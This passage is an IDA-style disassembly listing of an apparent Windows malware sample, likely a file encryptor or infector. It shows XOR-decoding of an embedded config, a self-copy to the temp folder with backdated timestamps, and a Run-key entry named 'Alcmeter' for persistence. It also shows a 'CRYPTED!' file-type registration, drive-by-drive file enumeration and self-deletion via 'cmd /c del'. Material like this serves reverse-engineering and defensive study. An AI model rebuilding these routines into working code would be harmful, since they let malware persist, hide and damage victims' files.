.text:00401DFA ; ---------------------------------------------------------------------------
.text:00401DFA
.text:00401DFA loc_401DFA:                             ; CODE XREF: sub_401AB9+195↑j
.text:00401DFA                 cmp     [ebp+Msg], 0Fh
.text:00401DFE                 jnz     short loc_401E20
.text:00401E00                 lea     eax, [ebp+Paint]
.text:00401E03                 push    eax             ; lpPaint
.text:00401E04                 push    [ebp+hWnd]      ; hWnd
.text:00401E07                 call    BeginPaint
.text:00401E0C                 lea     eax, [ebp+Paint]
.text:00401E0F                 push    eax             ; lpPaint
.text:00401E10                 push    [ebp+hWnd]      ; hWnd
.text:00401E13                 call    EndPaint
.text:00401E18                 xor     eax, eax
.text:00401E1A                 leave
.text:00401E1B                 retn    10h
.text:00401E1E ; ---------------------------------------------------------------------------
.text:00401E1E                 jmp     short loc_401E48
.text:00401E20 ; ---------------------------------------------------------------------------
.text:00401E20
.text:00401E20 loc_401E20:                             ; CODE XREF: sub_401AB9+345↑j
.text:00401E20                 cmp     [ebp+Msg], 10h
.text:00401E24                 jnz     short loc_401E35
.text:00401E26                 push    0               ; uExitCode
.text:00401E28                 call    ExitProcess
.text:00401E2D ; ---------------------------------------------------------------------------
.text:00401E2D                 xor     eax, eax
.text:00401E2F                 leave
.text:00401E30                 retn    10h
.text:00401E33 ; ---------------------------------------------------------------------------
.text:00401E33                 jmp     short loc_401E48
.text:00401E35 ; ---------------------------------------------------------------------------
.text:00401E35
.text:00401E35 loc_401E35:                             ; CODE XREF: sub_401AB9+36B↑j
.text:00401E35                 cmp     [ebp+Msg], 2
.text:00401E39                 jnz     short loc_401E48
.text:00401E3B                 push    0               ; uExitCode
.text:00401E3D                 call    ExitProcess
.text:00401E42 ; ---------------------------------------------------------------------------
.text:00401E42                 xor     eax, eax
.text:00401E44                 leave
.text:00401E45                 retn    10h
.text:00401E48 ; ---------------------------------------------------------------------------
.text:00401E48
.text:00401E48 loc_401E48:                             ; CODE XREF: sub_401AB9+23↑j
.text:00401E48                                         ; sub_401AB9+4E↑j ...
.text:00401E48                 push    [ebp+lParam]    ; lParam
.text:00401E4B                 push    [ebp+wParam]    ; wParam
.text:00401E4E                 push    [ebp+Msg]       ; Msg
.text:00401E51                 push    [ebp+hWnd]      ; hWnd
.text:00401E54                 call    DefWindowProcA
.text:00401E59                 leave
.text:00401E5A                 retn    10h
.text:00401E5A sub_401AB9      endp
.text:00401E5A
.text:00401E5D
.text:00401E5D ; =============== S U B R O U T I N E =======================================
.text:00401E5D
.text:00401E5D ; Attributes: bp-based frame
.text:00401E5D
.text:00401E5D ; int __stdcall sub_401E5D(unsigned int, unsigned int)
.text:00401E5D sub_401E5D      proc near               ; CODE XREF: start-7AF↑p
.text:00401E5D                                         ; start-79C↑p
.text:00401E5D
.text:00401E5D arg_0           = dword ptr  8
.text:00401E5D arg_4           = dword ptr  0Ch
.text:00401E5D
.text:00401E5D                 push    ebp
.text:00401E5E                 mov     ebp, esp
.text:00401E60                 shr     [ebp+arg_4], 1
.text:00401E63                 shr     [ebp+arg_0], 1
.text:00401E66                 mov     eax, [ebp+arg_0]
.text:00401E69                 sub     [ebp+arg_4], eax
.text:00401E6C                 mov     eax, [ebp+arg_4]
.text:00401E6F                 leave
.text:00401E70                 retn    8
.text:00401E70 sub_401E5D      endp
.text:00401E70
.text:00401E73
.text:00401E73 ; =============== S U B R O U T I N E =======================================
.text:00401E73
.text:00401E73 ; Attributes: bp-based frame
.text:00401E73
.text:00401E73 ; HWND __stdcall sub_401E73(LPCSTR lpWindowName, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu)
.text:00401E73 sub_401E73      proc near               ; CODE XREF: sub_401AB9+2B1↑p
.text:00401E73
.text:00401E73 lpWindowName    = dword ptr  8
.text:00401E73 X               = dword ptr  0Ch
.text:00401E73 Y               = dword ptr  10h
.text:00401E73 nWidth          = dword ptr  14h
.text:00401E73 nHeight         = dword ptr  18h
.text:00401E73 hWndParent      = dword ptr  1Ch
.text:00401E73 hMenu           = dword ptr  20h
.text:00401E73
.text:00401E73                 push    ebp
.text:00401E74                 mov     ebp, esp
.text:00401E76                 push    0               ; lpParam
.text:00401E78                 push    hInstance       ; hInstance
.text:00401E7E                 push    [ebp+hMenu]     ; hMenu
.text:00401E81                 push    [ebp+hWndParent] ; hWndParent
.text:00401E84                 push    [ebp+nHeight]   ; nHeight
.text:00401E87                 push    [ebp+nWidth]    ; nWidth
.text:00401E8A                 push    [ebp+Y]         ; Y
.text:00401E8D                 push    [ebp+X]         ; X
.text:00401E90                 push    50000180h       ; dwStyle
.text:00401E95                 push    [ebp+lpWindowName] ; lpWindowName
.text:00401E98                 push    offset aEdit    ; "EDIT"
.text:00401E9D                 push    200h            ; dwExStyle
.text:00401EA2                 call    CreateWindowExA
.text:00401EA7                 leave
.text:00401EA8                 retn    1Ch
.text:00401EA8 sub_401E73      endp
.text:00401EA8
.text:00401EAB
.text:00401EAB ; =============== S U B R O U T I N E =======================================
.text:00401EAB
.text:00401EAB ; Attributes: bp-based frame
.text:00401EAB
.text:00401EAB ; HWND __stdcall sub_401EAB(LPCSTR lpWindowName, HWND hWndParent, int X, int Y, int nWidth, int nHeight, HMENU hMenu)
.text:00401EAB sub_401EAB      proc near               ; CODE XREF: sub_401AB9+204↑p
.text:00401EAB                                         ; sub_401AB9+220↑p
.text:00401EAB
.text:00401EAB lpWindowName    = dword ptr  8
.text:00401EAB hWndParent      = dword ptr  0Ch
.text:00401EAB X               = dword ptr  10h
.text:00401EAB Y               = dword ptr  14h
.text:00401EAB nWidth          = dword ptr  18h
.text:00401EAB nHeight         = dword ptr  1Ch
.text:00401EAB hMenu           = dword ptr  20h
.text:00401EAB
.text:00401EAB                 push    ebp
.text:00401EAC                 mov     ebp, esp
.text:00401EAE                 push    0               ; lpParam
.text:00401EB0                 push    hInstance       ; hInstance
.text:00401EB6                 push    [ebp+hMenu]     ; hMenu
.text:00401EB9                 push    [ebp+hWndParent] ; hWndParent
.text:00401EBC                 push    [ebp+nHeight]   ; nHeight
.text:00401EBF                 push    [ebp+nWidth]    ; nWidth
.text:00401EC2                 push    [ebp+Y]         ; Y
.text:00401EC5                 push    [ebp+X]         ; X
.text:00401EC8                 push    50000000h       ; dwStyle
.text:00401ECD                 push    [ebp+lpWindowName] ; lpWindowName
.text:00401ED0                 push    offset aStatic  ; "STATIC"
.text:00401ED5                 push    0               ; dwExStyle
.text:00401ED7                 call    CreateWindowExA
.text:00401EDC                 leave
.text:00401EDD                 retn    1Ch
.text:00401EDD sub_401EAB      endp
.text:00401EDD
.text:00401EE0
.text:00401EE0 ; =============== S U B R O U T I N E =======================================
.text:00401EE0
.text:00401EE0 ; Attributes: bp-based frame
.text:00401EE0
.text:00401EE0 ; HWND __stdcall sub_401EE0(LPCSTR lpWindowName, HWND hWndParent, int X, int Y, int nWidth, int nHeight, HMENU hMenu)
.text:00401EE0 sub_401EE0      proc near               ; CODE XREF: sub_401AB9+24D↑p
.text:00401EE0                                         ; sub_401AB9+27F↑p ...
.text:00401EE0
.text:00401EE0 lpWindowName    = dword ptr  8
.text:00401EE0 hWndParent      = dword ptr  0Ch
.text:00401EE0 X               = dword ptr  10h
.text:00401EE0 Y               = dword ptr  14h
.text:00401EE0 nWidth          = dword ptr  18h
.text:00401EE0 nHeight         = dword ptr  1Ch
.text:00401EE0 hMenu           = dword ptr  20h
.text:00401EE0
.text:00401EE0                 push    ebp
.text:00401EE1                 mov     ebp, esp
.text:00401EE3                 push    0               ; lpParam
.text:00401EE5                 push    hInstance       ; hInstance
.text:00401EEB                 push    [ebp+hMenu]     ; hMenu
.text:00401EEE                 push    [ebp+hWndParent] ; hWndParent
.text:00401EF1                 push    [ebp+nHeight]   ; nHeight
.text:00401EF4                 push    [ebp+nWidth]    ; nWidth
.text:00401EF7                 push    [ebp+Y]         ; Y
.text:00401EFA                 push    [ebp+X]         ; X
.text:00401EFD                 push    50000000h       ; dwStyle
.text:00401F02                 push    [ebp+lpWindowName] ; lpWindowName
.text:00401F05                 push    offset aButton  ; "BUTTON"
.text:00401F0A                 push    0               ; dwExStyle
.text:00401F0C                 call    CreateWindowExA
.text:00401F11                 leave
.text:00401F12                 retn    1Ch
.text:00401F12 sub_401EE0      endp
.text:00401F12
.text:00401F15
.text:00401F15 ; =============== S U B R O U T I N E =======================================
.text:00401F15
.text:00401F15 ; Attributes: bp-based frame
.text:00401F15
.text:00401F15 ; BOOL __stdcall sub_401F15(BYTE *pbData, DWORD dwDataLen, BYTE *, DWORD pdwDataLen)
.text:00401F15 sub_401F15      proc near               ; CODE XREF: sub_401AB9+D9↑p
.text:00401F15                                         ; sub_401AB9+EC↑p ...
.text:00401F15
.text:00401F15 phHash          = dword ptr -8
.text:00401F15 phProv          = dword ptr -4
.text:00401F15 pbData          = dword ptr  8
.text:00401F15 dwDataLen       = dword ptr  0Ch
.text:00401F15 arg_8           = dword ptr  10h
.text:00401F15 pdwDataLen      = dword ptr  14h
.text:00401F15
.text:00401F15                 push    ebp
.text:00401F16                 mov     ebp, esp
.text:00401F18                 add     esp, 0FFFFFFF8h
.text:00401F1B                 push    0F0000000h      ; dwFlags
.text:00401F20                 push    1               ; dwProvType
.text:00401F22                 push    0               ; szProvider
.text:00401F24                 push    0               ; szContainer
.text:00401F26                 lea     eax, [ebp+phProv]
.text:00401F29                 push    eax             ; phProv
.text:00401F2A                 call    CryptAcquireContextA
.text:00401F2F                 cmp     eax, 0
.text:00401F32                 jle     short locret_401F83
.text:00401F34                 lea     eax, [ebp+phHash]
.text:00401F37                 push    eax             ; phHash
.text:00401F38                 push    0               ; dwFlags
.text:00401F3A                 push    0               ; hKey
.text:00401F3C                 push    8003h           ; Algid
.text:00401F41                 push    [ebp+phProv]    ; hProv
.text:00401F44                 call    CryptCreateHash
.text:00401F49                 cmp     eax, 0
.text:00401F4C                 jle     short locret_401F83
.text:00401F4E                 push    0               ; dwFlags
.text:00401F50                 push    [ebp+dwDataLen] ; dwDataLen
.text:00401F53                 push    [ebp+pbData]    ; pbData
.text:00401F56                 push    [ebp+phHash]    ; hHash
.text:00401F59                 call    CryptHashData
.text:00401F5E                 push    0               ; dwFlags
.text:00401F60                 lea     eax, [ebp+pdwDataLen]
.text:00401F63                 push    eax             ; pdwDataLen
.text:00401F64                 push    [ebp+arg_8]     ; pbData
.text:00401F67                 push    2               ; dwParam
.text:00401F69                 push    [ebp+phHash]    ; hHash
.text:00401F6C                 call    CryptGetHashParam
.text:00401F71                 push    [ebp+phHash]    ; hHash
.text:00401F74                 call    CryptDestroyHash
.text:00401F79                 push    0               ; dwFlags
.text:00401F7B                 push    [ebp+phProv]    ; hProv
.text:00401F7E                 call    CryptReleaseContext
.text:00401F83
.text:00401F83 locret_401F83:                          ; CODE XREF: sub_401F15+1D↑j
.text:00401F83                                         ; sub_401F15+37↑j
.text:00401F83                 leave
.text:00401F84                 retn    10h
.text:00401F84 sub_401F15      endp
.text:00401F84
.text:00401F87
.text:00401F87 ; =============== S U B R O U T I N E =======================================
.text:00401F87
.text:00401F87 ; Attributes: bp-based frame
.text:00401F87
.text:00401F87 ; BOOL sub_401F87()
.text:00401F87 sub_401F87      proc near               ; CODE XREF: start+A↓p
.text:00401F87
.text:00401F87 hResInfo        = dword ptr -10h
.text:00401F87 var_C           = dword ptr -0Ch
.text:00401F87 hResData        = dword ptr -8
.text:00401F87 var_4           = dword ptr -4
.text:00401F87
.text:00401F87                 push    ebp
.text:00401F88                 mov     ebp, esp
.text:00401F8A                 add     esp, 0FFFFFFF0h
.text:00401F8D                 push    ebx
.text:00401F8E                 push    2               ; lpType
.text:00401F90                 push    0Eh             ; lpName
.text:00401F92                 push    0               ; hModule
.text:00401F94                 call    FindResourceA
.text:00401F99                 or      eax, eax
.text:00401F9B                 jnz     short loc_401FA2
.text:00401F9D                 jmp     loc_402330
.text:00401FA2 ; ---------------------------------------------------------------------------
.text:00401FA2
.text:00401FA2 loc_401FA2:                             ; CODE XREF: sub_401F87+14↑j
.text:00401FA2                 mov     [ebp+hResInfo], eax
.text:00401FA5                 push    eax             ; hResInfo
.text:00401FA6                 push    0               ; hModule
.text:00401FA8                 call    SizeofResource
.text:00401FAD                 or      eax, eax
.text:00401FAF                 jnz     short loc_401FB6
.text:00401FB1                 jmp     loc_402330
.text:00401FB6 ; ---------------------------------------------------------------------------
.text:00401FB6
.text:00401FB6 loc_401FB6:                             ; CODE XREF: sub_401F87+28↑j
.text:00401FB6                 mov     [ebp+var_C], eax
.text:00401FB9                 push    [ebp+hResInfo]  ; hResInfo
.text:00401FBC                 push    0               ; hModule
.text:00401FBE                 call    LoadResource
.text:00401FC3                 or      eax, eax
.text:00401FC5                 jnz     short loc_401FCC
.text:00401FC7                 jmp     loc_402330
.text:00401FCC ; ---------------------------------------------------------------------------
.text:00401FCC
.text:00401FCC loc_401FCC:                             ; CODE XREF: sub_401F87+3E↑j
.text:00401FCC                 mov     [ebp+hResData], eax
.text:00401FCF                 push    eax             ; hResData
.text:00401FD0                 call    LockResource
.text:00401FD5                 or      eax, eax
.text:00401FD7                 jnz     short loc_401FDE
.text:00401FD9                 jmp     loc_402330
.text:00401FDE ; ---------------------------------------------------------------------------
.text:00401FDE
.text:00401FDE loc_401FDE:                             ; CODE XREF: sub_401F87+50↑j
.text:00401FDE                 mov     [ebp+var_4], eax
.text:00401FE1                 mov     edi, eax
.text:00401FE3                 push    10h
.text:00401FE5                 push    edi
.text:00401FE6                 push    offset dword_406DB9
.text:00401FEB                 call    RtlMoveMemory
.text:00401FF0                 add     edi, 10h
.text:00401FF3                 mov     eax, [ebp+var_C]
.text:00401FF6                 sub     eax, 10h
.text:00401FF9                 push    eax
.text:00401FFA                 push    edi
.text:00401FFB                 call    sub_40211B
.text:00402000                 mov     ebx, [edi]
.text:00402002                 add     edi, 4
.text:00402005                 push    ebx             ; dwBytes
.text:00402006                 push    8               ; dwFlags
.text:00402008                 push    hHeap           ; hHeap
.text:0040200E                 call    HeapAlloc
.text:00402013                 or      eax, eax
.text:00402015                 jnz     short loc_40201C
.text:00402017                 jmp     loc_402330
.text:0040201C ; ---------------------------------------------------------------------------
.text:0040201C
.text:0040201C loc_40201C:                             ; CODE XREF: sub_401F87+8E↑j
.text:0040201C                 mov     dword_407519, eax
.text:00402021                 push    ebx
.text:00402022                 push    edi
.text:00402023                 push    dword_407519
.text:00402029                 call    RtlMoveMemory
.text:0040202E                 add     edi, ebx
.text:00402030                 mov     ebx, [edi]
.text:00402032                 add     edi, 4
.text:00402035                 push    ebx             ; dwBytes
.text:00402036                 push    8               ; dwFlags
.text:00402038                 push    hHeap           ; hHeap
.text:0040203E                 call    HeapAlloc
.text:00402043                 or      eax, eax
.text:00402045                 jnz     short loc_40204C
.text:00402047                 jmp     loc_402330
.text:0040204C ; ---------------------------------------------------------------------------
.text:0040204C
.text:0040204C loc_40204C:                             ; CODE XREF: sub_401F87+BE↑j
.text:0040204C                 mov     lpText, eax
.text:00402051                 push    ebx
.text:00402052                 push    edi
.text:00402053                 push    lpText
.text:00402059                 call    RtlMoveMemory
.text:0040205E                 add     edi, ebx
.text:00402060                 mov     ebx, [edi]
.text:00402062                 add     edi, 4
.text:00402065                 push    ebx             ; dwBytes
.text:00402066                 push    8               ; dwFlags
.text:00402068                 push    hHeap           ; hHeap
.text:0040206E                 call    HeapAlloc
.text:00402073                 or      eax, eax
.text:00402075                 jnz     short loc_40207C
.text:00402077                 jmp     loc_402330
.text:0040207C ; ---------------------------------------------------------------------------
.text:0040207C
.text:0040207C loc_40207C:                             ; CODE XREF: sub_401F87+EE↑j
.text:0040207C                 mov     lpSubKey, eax
.text:00402081                 push    ebx
.text:00402082                 push    edi
.text:00402083                 push    lpSubKey
.text:00402089                 call    RtlMoveMemory
.text:0040208E                 add     edi, ebx
.text:00402090                 push    10h
.text:00402092                 push    edi
.text:00402093                 push    offset unk_406DC9
.text:00402098                 call    RtlMoveMemory
.text:0040209D                 add     edi, 10h
.text:004020A0                 push    5
.text:004020A2                 push    edi
.text:004020A3                 push    offset byte_407529
.text:004020A8                 call    RtlMoveMemory
.text:004020AD                 add     edi, 5
.text:004020B0                 push    10h
.text:004020B2                 push    edi
.text:004020B3                 push    offset byte_406DD9
.text:004020B8                 call    RtlMoveMemory
.text:004020BD                 add     edi, 10h
.text:004020C0                 push    10h
.text:004020C2                 push    edi
.text:004020C3                 push    offset byte_406DE9
.text:004020C8                 call    RtlMoveMemory
.text:004020CD                 add     edi, 10h
.text:004020D0                 push    4
.text:004020D2                 push    edi
.text:004020D3                 push    offset dword_407525
.text:004020D8                 call    RtlMoveMemory
.text:004020DD                 add     edi, 4
.text:004020E0                 push    4
.text:004020E2                 push    edi
.text:004020E3                 push    offset dword_4065A5
.text:004020E8                 call    RtlMoveMemory
.text:004020ED                 add     edi, 4
.text:004020F0                 push    4
.text:004020F2                 push    edi
.text:004020F3                 push    offset lDistanceToMove
.text:004020F8                 call    RtlMoveMemory
.text:004020FD                 add     edi, 4
.text:00402100                 push    4
.text:00402102                 push    edi
.text:00402103                 push    offset nNumberOfBytesToRead
.text:00402108                 call    RtlMoveMemory
.text:0040210D                 add     edi, 4
.text:00402110                 push    [ebp+hResData]  ; hResData
.text:00402113                 call    FreeResource
.text:00402118                 pop     ebx
.text:00402119                 leave
.text:0040211A                 retn
.text:0040211A sub_401F87      endp
.text:0040211A
.text:0040211B
.text:0040211B ; =============== S U B R O U T I N E =======================================
.text:0040211B
.text:0040211B ; Attributes: bp-based frame
.text:0040211B
.text:0040211B ; int __userpurge __spoils<ecx> sub_40211B@<edx>(int@<ecx>, int@<edx>, char *, int)
.text:0040211B sub_40211B      proc near               ; CODE XREF: sub_401F87+74↑p
.text:0040211B
.text:0040211B arg_0           = dword ptr  8
.text:0040211B arg_4           = dword ptr  0Ch
.text:0040211B
.text:0040211B                 push    ebp
.text:0040211C                 mov     ebp, esp
.text:0040211E                 pusha
.text:0040211F                 mov     ebx, offset dword_406DB9
.text:00402124                 mov     esi, [ebp+arg_0]
.text:00402127                 mov     edi, esi
.text:00402129                 xor     edx, edx
.text:0040212B                 mov     ecx, [ebp+arg_4]
.text:0040212E                 test    ecx, ecx
.text:00402130                 jnz     short loc_402136
.text:00402132                 leave
.text:00402133                 retn    8
.text:00402136 ; ---------------------------------------------------------------------------
.text:00402136
.text:00402136 loc_402136:                             ; CODE XREF: sub_40211B+15↑j
.text:00402136                                         ; sub_40211B+29↓j
.text:00402136                 cmp     edx, 10h
.text:00402139                 jnz     short loc_40213D
.text:0040213B                 xor     edx, edx
.text:0040213D
.text:0040213D loc_40213D:                             ; CODE XREF: sub_40211B+1E↑j
.text:0040213D                 lodsb
.text:0040213E                 xor     al, [edx+ebx]
.text:00402141                 stosb
.text:00402142                 inc     edx
.text:00402143                 dec     ecx
.text:00402144                 jnz     short loc_402136
.text:00402146                 popa
.text:00402147                 leave
.text:00402148                 retn    8
.text:00402148 sub_40211B      endp
.text:00402148
.text:0040214B
.text:0040214B ; =============== S U B R O U T I N E =======================================
.text:0040214B
.text:0040214B
.text:0040214B ; HINSTANCE sub_40214B()
.text:0040214B sub_40214B      proc near               ; CODE XREF: sub_401AB9+91↑p
.text:0040214B                                         ; sub_401AB9+14D↑p
.text:0040214B                 jmp     short loc_402167
.text:0040214B ; ---------------------------------------------------------------------------
.text:0040214D ; const CHAR aComspec[]
.text:0040214D aComspec        db 'ComSpec',0          ; DATA XREF: sub_40214B+26↓o
.text:00402155 ; const CHAR aCDel[]
.text:00402155 aCDel           db '/c del "',0         ; DATA XREF: sub_40214B+30↓o
.text:0040215E ; const CHAR aNul[]
.text:0040215E aNul            db '" >> NUL',0         ; DATA XREF: sub_40214B+4E↓o
.text:00402167 ; ---------------------------------------------------------------------------
.text:00402167
.text:00402167 loc_402167:                             ; CODE XREF: sub_40214B↑j
.text:00402167                 push    200h            ; nSize
.text:0040216C                 push    offset File     ; lpBuffer
.text:00402171                 push    offset aComspec ; "ComSpec"
.text:00402176                 call    GetEnvironmentVariableA
.text:0040217B                 push    offset aCDel    ; "/c del \""
.text:00402180                 push    offset Parameters ; lpString1
.text:00402185                 call    lstrcpyA
.text:0040218A                 push    offset Filename ; lpString2
.text:0040218F                 push    offset Parameters ; lpString1
.text:00402194                 call    lstrcatA
.text:00402199                 push    offset aNul     ; "\" >> NUL"
.text:0040219E                 push    offset Parameters ; lpString1
.text:004021A3                 call    lstrcatA
.text:004021A8                 push    0               ; nShowCmd
.text:004021AA                 push    0               ; lpDirectory
.text:004021AC                 push    offset Parameters ; lpParameters
.text:004021B1                 push    offset File     ; lpFile
.text:004021B6                 push    0               ; lpOperation
.text:004021B8                 push    0               ; hwnd
.text:004021BA                 call    ShellExecuteA
.text:004021BF                 retn
.text:004021BF sub_40214B      endp
.text:004021BF
.text:004021C0
.text:004021C0 ; =============== S U B R O U T I N E =======================================
.text:004021C0
.text:004021C0
.text:004021C0 ; LSTATUS sub_4021C0()
.text:004021C0 sub_4021C0      proc near               ; CODE XREF: sub_401AB9+8C↑p
.text:004021C0                                         ; sub_401AB9+148↑p
.text:004021C0                 push    lpSubKey        ; lpSubKey
.text:004021C6                 push    80000000h       ; hKey
.text:004021CB                 call    RegDeleteKeyA
.text:004021D0                 retn
.text:004021D0 sub_4021C0      endp
.text:004021D0
.text:004021D1
.text:004021D1 ; =============== S U B R O U T I N E =======================================
.text:004021D1
.text:004021D1
.text:004021D1 ; WPARAM __userpurge start@<eax>(int@<ebp>, int, int, int, int)
.text:004021D1                 public start
.text:004021D1 start           proc near
.text:004021D1
.text:004021D1 ; FUNCTION CHUNK AT .text:0040196F SIZE 0000014A BYTES
.text:004021D1
.text:004021D1                 call    GetProcessHeap
.text:004021D6                 mov     hHeap, eax
.text:004021DB                 call    sub_401F87
.text:004021E0                 push    offset Buffer   ; lpBuffer
.text:004021E5                 push    200h            ; nBufferLength
.text:004021EA                 call    GetTempPathA
.text:004021EF                 push    offset Buffer   ; lpString2
.text:004021F4                 push    offset String   ; lpString1
.text:004021F9                 call    lstrcpyA
.text:004021FE                 push    500h            ; nSize
.text:00402203                 push    offset Filename ; lpFilename
.text:00402208                 push    0               ; hModule
.text:0040220A                 call    GetModuleFileNameA
.text:0040220F                 push    nNumberOfBytesToRead ; dwBytes
.text:00402215                 push    8               ; dwFlags
.text:00402217                 push    hHeap           ; hHeap
.text:0040221D                 call    HeapAlloc
.text:00402222                 mov     lpBuffer, eax
.text:00402227                 push    offset dword_406DB9
.text:0040222C                 call    sub_4017B4
.text:00402231                 call    sub_402472
.text:00402236                 push    offset byte_406DD9 ; lpString2
.text:0040223B                 push    offset String   ; lpString1
.text:00402240                 call    lstrcatA
.text:00402245                 push    offset aExe     ; ".exe"
.text:0040224A                 push    offset String   ; lpString1
.text:0040224F                 call    lstrcatA
.text:00402254                 push    1               ; bFailIfExists
.text:00402256                 push    offset String   ; lpNewFileName
.text:0040225B                 push    offset Filename ; lpExistingFileName
.text:00402260                 call    CopyFileA
.text:00402265                 or      eax, eax
.text:00402267                 jnz     short loc_40226E
.text:00402269                 jmp     loc_40196F
.text:0040226E ; ---------------------------------------------------------------------------
.text:0040226E
.text:0040226E loc_40226E:                             ; CODE XREF: start+96↑j
.text:0040226E                 push    0               ; hTemplateFile
.text:00402270                 push    0               ; dwFlagsAndAttributes
.text:00402272                 push    3               ; dwCreationDisposition
.text:00402274                 push    0               ; lpSecurityAttributes
.text:00402276                 push    2               ; dwShareMode
.text:00402278                 push    40000000h       ; dwDesiredAccess
.text:0040227D                 push    offset String   ; lpFileName
.text:00402282                 call    CreateFileA
.text:00402287                 mov     hFile, eax
.text:0040228C                 push    offset LastWriteTime ; lpLastWriteTime
.text:00402291                 push    offset LastAccessTime ; lpLastAccessTime
.text:00402296                 push    offset CreationTime ; lpCreationTime
.text:0040229B                 push    hFile           ; hFile
.text:004022A1                 call    SetFileTime
.text:004022A6                 push    hFile           ; hObject
.text:004022AC                 call    CloseHandle
.text:004022B1                 cmp     byte_407529, 1
.text:004022B8                 jnz     short loc_4022D3
.text:004022BA                 push    offset String   ; lpString
.text:004022BF                 push    offset ValueName ; "Alcmeter"
.text:004022C4                 push    offset SubKey   ; "SOFTWARE\\Microsoft\\Windows\\CurrentVe"...
.text:004022C9                 push    80000002h       ; hKey
.text:004022CE                 call    sub_402422
.text:004022D3
.text:004022D3 loc_4022D3:                             ; CODE XREF: start+E7↑j
.text:004022D3                 call    sub_402342
.text:004022D8                 mov     byte_406550, 0
.text:004022DF                 push    1               ; uMode
.text:004022E1                 call    SetErrorMode
.text:004022E6                 call    GetLogicalDrives
.text:004022EB                 mov     ecx, 19h
.text:004022F0
.text:004022F0 loc_4022F0:                             ; CODE XREF: start+158↓j
.text:004022F0                 mov     ebx, 1
.text:004022F5                 shl     ebx, cl
.text:004022F7                 and     ebx, eax
.text:004022F9                 jz      short loc_402328
.text:004022FB                 add     cl, 41h ; 'A'
.text:004022FE                 mov     byte ptr dword_40444F+1, cl
.text:00402304                 sub     cl, 41h ; 'A'
.text:00402307                 mov     dword_40444F+2, 2E2A5C3Ah
.text:00402311                 mov     byte_404455, 2Ah ; '*'
.text:00402318                 mov     byte_404456, 0
.text:0040231F                 push    eax
.text:00402320                 push    ecx
.text:00402321                 call    sub_4013A8
.text:00402326                 pop     ecx
.text:00402327                 pop     eax
.text:00402328
.text:00402328 loc_402328:                             ; CODE XREF: start+128↑j
.text:00402328                 dec     ecx
.text:00402329                 jge     short loc_4022F0
.text:0040232B                 call    sub_401000
.text:00402330
.text:00402330 loc_402330:                             ; CODE XREF: sub_401F87+16↑j
.text:00402330                                         ; sub_401F87+2A↑j ...
.text:00402330                 push    lpBuffer        ; hMem
.text:00402336                 call    GlobalFree
.text:0040233B                 push    0               ; uExitCode
.text:0040233D                 call    ExitProcess
.text:0040233D start           endp
.text:0040233D
.text:00402342
.text:00402342 ; =============== S U B R O U T I N E =======================================
.text:00402342
.text:00402342
.text:00402342 ; LSTATUS sub_402342()
.text:00402342 sub_402342      proc near               ; CODE XREF: start:loc_4022D3↑p
.text:00402342                 push    offset asc_404032 ; "."
.text:00402347                 push    offset byte_4065B9 ; lpString1
.text:0040234C                 call    lstrcpyA
.text:00402351                 push    lpSubKey        ; lpString2
.text:00402357                 push    offset byte_4065B9 ; lpString1
.text:0040235C                 call    lstrcatA
.text:00402361                 push    offset byte_406DE9 ; lpString
.text:00402366                 push    offset byte_40444B ; lpValueName
.text:0040236B                 push    offset byte_4065B9 ; lpSubKey
.text:00402370                 push    80000000h       ; hKey
.text:00402375                 call    sub_402422
.text:0040237A                 push    offset aCrypted ; "CRYPTED!"
.text:0040237F                 push    offset byte_40444B ; lpValueName
.text:00402384                 push    offset byte_406DE9 ; lpSubKey
.text:00402389                 push    80000000h       ; hKey
.text:0040238E                 call    sub_402422
.text:00402393                 push    offset byte_406DE9 ; lpString2
.text:00402398                 push    offset byte_4065B9 ; lpString1
.text:0040239D                 call    lstrcpyA
.text:004023A2                 push    offset aDefaulticon ; "\\DefaultIcon"
.text:004023A7                 push    offset byte_4065B9 ; lpString1
.text:004023AC                 call    lstrcatA
.text:004023B1                 push    offset a0       ; ",0"
.text:004023B6                 push    offset String   ; lpString1
.text:004023BB                 call    lstrcatA
.text:004023C0                 push    offset String   ; lpString
.text:004023C5                 push    offset byte_40444B ; lpValueName
.text:004023CA                 push    offset byte_4065B9 ; lpSubKey
.text:004023CF                 push    80000000h       ; hKey
.text:004023D4                 call    sub_402422
.text:004023D9                 push    offset byte_406DE9 ; lpString2
.text:004023DE                 push    offset byte_4065B9 ; lpString1
.text:004023E3                 call    lstrcpyA
.text:004023E8                 push    offset aShellOpenComma ; "\\shell\\open\\command"
.text:004023ED                 push    offset byte_4065B9 ; lpString1
.text:004023F2                 call    lstrcatA
.text:004023F7                 push    offset String   ; lpString
.text:004023FC                 call    lstrlenA
.text:00402401                 mov     byte_40594E[eax], 0
.text:00402408                 push    offset String   ; lpString
.text:0040240D                 push    offset byte_40444B ; lpValueName
.text:00402412                 push    offset byte_4065B9 ; lpSubKey
.text:00402417                 push    80000000h       ; hKey
.text:0040241C                 call    sub_402422
.text:00402421                 retn
.text:00402421 sub_402342      endp
.text:00402421
.text:00402422
.text:00402422 ; =============== S U B R O U T I N E =======================================
.text:00402422
.text:00402422 ; Attributes: bp-based frame
.text:00402422
.text:00402422 ; LSTATUS __stdcall sub_402422(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, LPCSTR lpString)
.text:00402422 sub_402422      proc near               ; CODE XREF: start+FD↑p
.text:00402422                                         ; sub_402342+33↑p ...
.text:00402422
.text:00402422 phkResult       = dword ptr -8
.text:00402422 dwDisposition   = dword ptr -4
.text:00402422 hKey            = dword ptr  8
.text:00402422 lpSubKey        = dword ptr  0Ch
.text:00402422 lpValueName     = dword ptr  10h
.text:00402422 lpString        = dword ptr  14h
.text:00402422
.text:00402422                 push    ebp
.text:00402423                 mov     ebp, esp
.text:00402425                 add     esp, 0FFFFFFF8h
.text:00402428                 lea     eax, [ebp+dwDisposition]
.text:0040242B                 push    eax             ; lpdwDisposition
.text:0040242C                 lea     eax, [ebp+phkResult]
.text:0040242F                 push    eax             ; phkResult
.text:00402430                 push    0               ; lpSecurityAttributes
.text:00402432                 push    2001Fh          ; samDesired
.text:00402437                 push    0               ; dwOptions
.text:00402439                 push    offset Class    ; "REG_SZ"
.text:0040243E                 push    0               ; Reserved
.text:00402440                 push    [ebp+lpSubKey]  ; lpSubKey
.text:00402443                 push    [ebp+hKey]      ; hKey
.text:00402446                 call    RegCreateKeyExA
.text:0040244B                 push    [ebp+lpString]  ; lpString
.text:0040244E                 call    lstrlenA
.text:00402453                 push    eax             ; cbData
.text:00402454                 push    [ebp+lpString]  ; lpData
